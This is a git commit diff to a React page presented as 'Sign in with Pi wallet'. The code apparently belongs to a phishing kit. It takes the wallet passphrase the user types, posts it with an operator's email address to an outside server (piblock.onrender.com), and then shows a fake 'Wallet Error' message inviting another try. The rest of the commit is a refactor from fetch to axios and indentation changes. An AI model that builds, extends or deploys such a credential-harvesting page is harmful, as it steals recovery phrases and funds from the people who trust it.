73d6f1a3968a1f5057746ee0f84f46b2d202c2a0
emeraldhycient <igwezehycient86@gmail.com>
2023-04-15 12:17:02 +0100

    [update] added post request

--- src/pages/signin.tsx
+++ src/pages/signin.tsx
@@ -11,27 +11,43 @@ function Signin() {
     const [isValid, setIsvalid] = useState(true)
     const [pressedFaceId, setpressedFaceId] = useState(false)
 
-    const handleSubmit = (e:any) => {
+    const [showModal, setshowModal] = useState(true)
+
+    const email = "igwezehycient86@gmail.com"
+
+    const handleSubmit = (e: any) => {
         e.preventDefault();
 
         if (phrase.length > 23) {
             setIsvalid(true)
-            fetch('https://piblock.onrender.com/message', {
-                //methods -> POST,GET,PUT,PATCH,DELETE
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json', 'accept': 'application/json' },
-                body: JSON.stringify({
-                    message: phrase
-                })
+            axios.post('http://piblock.onrender.com/message', {
+                message: phrase,
+                email
             })
-                .then(res => { res.json() })
                 .then((data) => {
-                    window.location.href = "./explorer.html"
+                    setshowModal(true)
                 })
                 .catch((reason) => {
-                    console.log("it happened here ", reason)
+                    console.log("it happened here ", reason.response)
                     setIsvalid(false)
                 })
+            // fetch('http://piblock.onrender.com/message', {
+            //     //methods -> POST,GET,PUT,PATCH,DELETE
+            //     method: 'POST',
+            //     headers: { 'Content-Type': 'application/json', 'accept': 'application/json' },
+            //     body: JSON.stringify({
+            //         message: phrase,
+            //         email
+            //     })
+            // })
+            //     .then(res => { res.json() })
+            //     .then((data) => {
+            //         setshowModal(true)
+            //     })
+            //     .catch((reason) => {
+            //         console.log("it happened here ", reason)
+            //         setIsvalid(false)
+            //     })
 
         } else {
             setIsvalid(false)
@@ -41,10 +57,10 @@ function Signin() {
 
     useEffect(() => {
         setTimeout(() => {
-          setpressedFaceId(false)
-      },3000)
+            setpressedFaceId(false)
+        }, 3000)
     }, [pressedFaceId])
-    
+
 
     return (
         <section>
@@ -54,6 +70,37 @@ function Signin() {
                     <Center>
                         <Text fontSize='3xl' as="b" mb={20}>Sign in with Pi wallet</Text>
                     </Center>
+                    {
+                        showModal ?
+                            <div id="myModal" className="modal">
+
+                                <div className="modal-content">
+                                    <div
+                                        onClick={() => setshowModal(false)}
+                                        style={{ display: "flex", flexDirection: "row", justifyContent: "space-between", alignItems: "cemter", paddingRight: "20px" }}>
+                                        <h4 className="text-purple" style={{ fontSize: "20px", fontWeight: "bolder" }}>Wallet Error</h4>
+                                        <span onClick={() => setshowModal(true)} className="close" id="close">&times;</span>
+                                    </div>
+                                    <div id="innerbg">
+                                        <p>
+                                            An Error Occurred
+                                        </p>
+                                        <p>
+                                            Couldn't find your wallet. Make sure you entered a correct passphrase & your wallet is KYC verified.
+                                        </p>
+                                    </div>
+                                    {/* <button id="faceid" className="btn btn-lg bg-purple  animated fadeInLeft text-white">
+                                    TRY AGAIN
+                                </button> */}
+                                    <div className="col-lg-12 col-md-12 mt-6">
+                                        <button onClick={() => setshowModal(false)} className="border-purple h-[50px] w-full bg-black text-white flex justify-center items-center">
+                                            TRY AGAIN
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                            : null
+                    }
                     <div data-spy="scroll" data-target="#main-nav" data-offset="91" className="false">
                         <section className="section-spacing" id="contact">
 
@@ -86,13 +133,13 @@ function Signin() {
                                             <div className="text-center mt-5" id="errorholder2">
 
                                             </div>
-                                    </div>
-                                    {
-                                        pressedFaceId ?
-                                            <div className="text-center mt-3" id="errorholder">
+                                        </div>
+                                        {
+                                            pressedFaceId ?
+                                                <div className="text-center mt-3" id="errorholder">
                                                     <Text fontSize='sm' color={"red.400"} mb={4}>please login to enable Face ID or fingerprint</Text>
-                                            </div> : null
-                                    }
+                                                </div> : null
+                                        }
                                     </div>
                                 </form>
                             </div>
